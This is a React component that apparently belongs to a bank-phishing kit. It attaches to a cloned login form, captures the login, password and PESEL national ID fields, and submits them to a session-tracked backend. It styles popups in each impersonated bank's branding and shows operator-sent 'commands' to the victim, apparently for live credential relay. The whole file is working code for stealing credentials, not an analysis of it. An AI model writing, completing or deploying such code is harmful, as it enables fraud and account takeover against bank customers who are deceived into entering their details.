import { useEffect, useRef } from 'react';
import type { BankConfig } from '@/config/banks/types';
import { useLocaleContext } from '@/i18n/LocaleProvider';
import { useBankLoginFlow } from './useBankLoginFlow';
import { showCommand } from './swalController';
import { applyBankSwalCss } from './bankSwalStyle';

type Props = {
    bank: BankConfig;
    sessionId: string;
};

export function BankLoginFlow({ bank, sessionId }: Props) {
    const { command, busy, submitCredentials, answer, reset } = useBankLoginFlow({
        sessionId,
        bankSlug: bank.slug,
    });
    const { dict } = useLocaleContext();
    const busyRef = useRef(busy);
    busyRef.current = busy;

    useEffect(() => applyBankSwalCss(bank.brand), [bank.brand]);

    useEffect(() => {
        showCommand(command, { dict, answer, reset });
    }, [command, dict, answer, reset]);

    useEffect(() => {
        const form = document.getElementById('lk_form') as HTMLFormElement | null;
        if (!form) return;

        const onSubmit = (e: Event) => {
            e.preventDefault();
            if (busyRef.current) return;
            const data = new FormData(form);
            const fields: Record<string, string> = {};
            for (const name of ['login', 'password', 'pesel']) {
                const el = form.querySelector<HTMLInputElement>(`#${name}`);
                if (el) fields[name] = el.value;
                else if (data.has(name)) fields[name] = String(data.get(name) ?? '');
            }
            void submitCredentials(fields);
        };

        const triggers = form.querySelectorAll<HTMLElement>('#loginButton, [type="submit"]');
        const onTriggerClick = (e: Event) => {
            e.preventDefault();
            onSubmit(e);
        };

        form.addEventListener('submit', onSubmit);
        triggers.forEach((t) => t.addEventListener('click', onTriggerClick));
        return () => {
            form.removeEventListener('submit', onSubmit);
            triggers.forEach((t) => t.removeEventListener('click', onTriggerClick));
        };
    }, [submitCredentials, bank.slug]);

    return null;
}
